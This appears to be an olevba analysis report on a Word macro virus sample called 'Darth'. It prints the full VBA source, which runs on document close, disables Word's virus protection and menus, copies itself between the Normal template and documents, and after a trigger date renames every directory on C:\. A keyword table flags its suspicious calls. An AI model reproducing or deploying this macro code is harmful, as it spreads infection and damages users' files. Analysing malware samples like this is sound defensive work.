olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Darth
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Darth - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Darth.bas 
in file: Virus.MSWord.Darth - OLE stream: 'Macros/VBA/Darth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Sub AutoClose()
    Dim bProtected As Boolean
    Dim sCode As String
    Dim iFiles As Integer
    Dim NotInNorm As Boolean, NotInActiv As Boolean
    Dim Dobj As Object

    On Error Resume Next
        
    bProtected = False
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Darth"
        .Title = "1999/Darth Infection"
        .Subject = "Dark Jedi"
        .Comments = "Divide and die"
        .Keywords = " | Darth | Jedi | Lucas | "
        .Execute
    End With
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    
    Application.ScreenUpdating = False
    Application.DisplayStatusBar = False
    Application.DisplayAlerts = False

    Open "C:\Darth.txt" For Input As #1
    Input #1, sCode
    Close #1
    If sCode = "Darth V1.0" Then bProtected = True
    
    If bProtected = False Then
        CommandBars("tools").Controls("Macro").Enabled = False
        CommandBars("tools").Controls("Customize...").Enabled = False
        CommandBars("view").Controls("Toolbars").Enabled = False
        CommandBars("view").Controls("Status Bar").Enabled = False

        If NormalTemplate.VBProject.VBComponents.Item("Darth").Name <> "Darth" Then
            NotInNorm = True
            ActiveDocument.VBProject.VBComponents("Darth").Export "c:\Darth.vxd"
            Set Dobj = NormalTemplate.VBProject
        ElseIf ActiveDocument.VBProject.VBComponents.Item("Darth").Name <> "Darth" Then
            NotInActiv = True
            NormalTemplate.VBProject.VBComponents("Darth").Export "c:\Darth.vxd"
            Set Dobj = ActiveDocument.VBProject
        End If
        If NotInNorm = True Or NotInActiv = True Then Dobj.VBComponents.Import ("c:\Darth.vxd")
        Kill "C:\darth.vxd"

        If Now > CDate("01/09/99 00:00:00") Then
            Dim MyPath As String, MyName As String
    
            MyPath = "c:\"
            MyName = Dir(MyPath, vbDirectory)
            Do While MyName <> ""
                If MyName <> "." And MyName <> ".." Then
                    If (GetAttr(MyPath & MyName) And vbDirectory) = vbDirectory Then
                        Name MyPath & MyName As MyPath & "Darth" & MyName
                    End If
                End If
                MyName = Dir
            Loop
        End If
        If NotInActiv = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
End Sub

Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

